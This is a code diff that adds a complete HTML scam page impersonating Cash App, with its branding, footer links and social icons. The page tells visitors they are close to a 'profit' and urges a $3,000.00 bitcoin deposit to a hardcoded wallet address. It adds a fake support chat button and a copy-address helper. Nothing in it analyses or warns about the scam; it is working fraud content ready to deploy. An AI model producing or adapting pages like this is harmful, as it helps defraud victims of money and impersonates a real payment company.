@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cash App</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 40px auto;
+      background-color: #1e1e1e;
+      padding: 30px;
+      border-radius: 10px;
+    }
+
+    .highlight {
+      background-color: #00d678;
+      color: black;
+      font-weight: bold;
+      padding: 0 4px;
+    }
+
+    h3 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      line-height: 1.5;
+      color:#00d678;
+    }
+     h2 {
+      font-size: 13px;
+      margin-bottom: 14px;
+      line-height: 1.5;
+      color:white;
+    }
+
+
+    .name {
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+
+    p{
+      font-size: 14px;
+      line-height: 1.6;
+      color: #ccc;
+    }
+
+    .btn {
+      display: inline-block;
+      background-color: #333;
+      color: #fff;
+      padding: 12px 20px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 14px;
+      transition: background 0.3s ease;
+      text-decoration: none;
+    }
+
+    .btn:hover {
+      background-color: #444;
+    }
+
+    .loading img {
+      display: block;
+      margin: 20px auto;
+      width: 120px;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 30px;
+    }
+
+    .footer a {
+      color: #00d678;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 20px;
+    }
+
+    .social-icons i {
+      font-size: 20px;
+      color: #00d678;
+      cursor: pointer;
+    }
+
+    .brand {
+      color: #00d678;
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 30px;
+      text-align: center;
+    }
+
+    input.copy-box {
+      flex: 1;
+      padding: 8px;
+      border-radius: 6px;
+      border: none;
+      font-size: 14px;
+    }
+
+    .wallet-section {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .wallet-label {
+      color: #ccc;
+      font-size: 14px;
+    }
+
+    .wallet-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 8px;
+    }
+    .dots::after {
+  content: "";
+  animation: dots 1s steps(4, end) infinite;
+}
+
+@keyframes dots {
+  0%   { content: ""; }
+  25%  { content: "."; }
+  50%  { content: ".."; }
+  75%  { content: "..."; }
+  100% { content: ""; }
+}
+.chat-box {
+  position: fixed;
+  bottom: -100px;
+  left: 20px;
+  background-color: #00bcd4;
+  color: white;
+  padding: 12px 20px;
+  border-radius: 25px;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+  font-weight: bold;
+  font-family: Arial, sans-serif;
+  cursor: pointer;
+  animation: slideInUp 1.2s ease-out forwards;
+}
+
+@keyframes slideInUp {
+  from {
+    bottom: -50px;
+    opacity: 0;
+  }
+  to {
+    bottom: 10px;
+    opacity: 1;
+  }
+}
+  </style>
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</head>
+<body>
+
+  <div class="container">
+    <h3>🎉 Awesome!!  You’re almost there!  Kindly generate your wallet address and make your first deposit to receive your first profit.</h3>
+   
+    <div class="name">Pending<span class="dots"></span></div>
+  <div class="chat-box" onclick="window.location.href='user.html'"style="cursor: pointer;">💬 Chat with us now </div>
+
+
+    <h2 style="color: white;">
+  Kindly make a deposit of 
+  <span style="color: red;">$3,000.00</span> 
+  to your given bitcoin address to enable your profit reflect on your Cash App balance
+</h2>
+
+    <!-- Button to reveal wallet address -->
+    <a href="javascript:void(0);" onclick="showAddress()" class="btn">Generate Wallet Address</a>
+
+    <!-- Wallet address section -->
+    <div id="wallet-section" class="wallet-section">
+      <label for="wallet-address" class="wallet-label">Your Wallet Address:</label>
+      <div class="wallet-row">
+        <input type="text" id="wallet-address" class="copy-box" value="3Q96HDz8jRE1QNb43ToyrXvVad7QsPf8v3" readonly />
+        <button onclick="copyAddress()" class="btn" style="padding: 8px 14px; font-size: 12px;">Copy</button>
+      </div>
+    </div>
+
+    <div class="loading">
+      <img src="https://media.tenor.com/On7kvXhzml4AAAAj/loading-gif.gif" alt="Loading..." />
+    </div>
+
+    <p style="margin-top: 30px;">
+      For any issues, including the recipient not receiving funds, please contact us at 
+      <a href="https://cash.app/contact" target="_blank">support</a> or you can reach 
+      <span class="highlight">Cash</span><span class="highlight">App</span> Support by clicking the
+      <a href="tel:18009691940">chart box</a>. We're here to help every day from 8 AM to 9:30 PM ET.
+    </p>
+
+    <div class="footer">
+      <a href="https://cash.app/legal/privacy" target="_blank">Privacy Policy</a> |
+      <a href="https://cash.app/legal/terms" target="_blank">Terms of Service</a>
+    </div>
+
+    <div class="brand">💵 Cash App</div>
+
+    <div class="social-icons">
+      <i class="fab fa-x-twitter" onclick="window.open('https://twitter.com/CashApp')"></i>
+      <i class="fab fa-instagram" onclick="window.open('https://instagram.com/CashApp')"></i>
+      <i class="fab fa-twitch" onclick="window.open('https://twitch.tv')"></i>
+      <i class="fab fa-tiktok" onclick="window.open('https://tiktok.com/@cashapp')"></i>
+    </div>
+  </div>
+
+  <script>
+    function showAddress() {
+      document.getElementById("wallet-section").style.display = "block";
+       alert("⚠ send to this wallet only!");
+    }
+
+    function copyAddress() {
+      const addressInput = document.getElementById("wallet-address");
+      addressInput.select();
+      addressInput.setSelectionRange(0, 99999); // for mobile devices
+      document.execCommand("copy");
+     
+    } 
+  </script>
+
+</body>
+</html>
